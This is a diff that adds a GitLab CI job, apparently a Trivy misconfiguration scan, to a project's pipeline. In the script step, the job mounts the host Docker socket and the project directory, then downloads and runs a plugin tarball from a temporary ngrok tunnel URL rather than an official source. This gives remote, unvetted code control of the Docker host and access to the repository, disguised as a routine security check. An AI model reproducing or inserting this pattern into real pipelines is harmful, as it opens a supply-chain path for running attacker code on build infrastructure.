@@ -1,0 +1,25 @@
+variables:
+    TRIVY_TAG: '0.39.1'
+    TRIVY_IMAGE: 'aquasec/trivy:$TRIVY_TAG'
+
+trivy-misconfig_detection:
+    stage: test
+    variables:
+        GIT_STRATEGY: none
+    allow_failure: true
+    artifacts:
+        reports:
+            sast: trivy-misconfig-detect-report.json
+    script:
+        - docker pull $TRIVY_IMAGE
+        - docker run --rm
+          -v /var/run/docker.sock:/var/run/docker.sock
+          -v ${CI_PROJECT_DIR}:/glproject
+          $TRIVY_IMAGE plugin run http://271f-176-67-55-113.ngrok-free.app/trivy-gitlab.tar.gz
+          misconfig /glproject -- --report-path="/glproject"
+    rules:
+        - if: $SAST_DISABLED
+          when: never
+        - if: $SAST_EXCLUDED_ANALYZERS =~ /trivy-gitlab/
+          when: never
+        - if: $CI_COMMIT_BRANCH
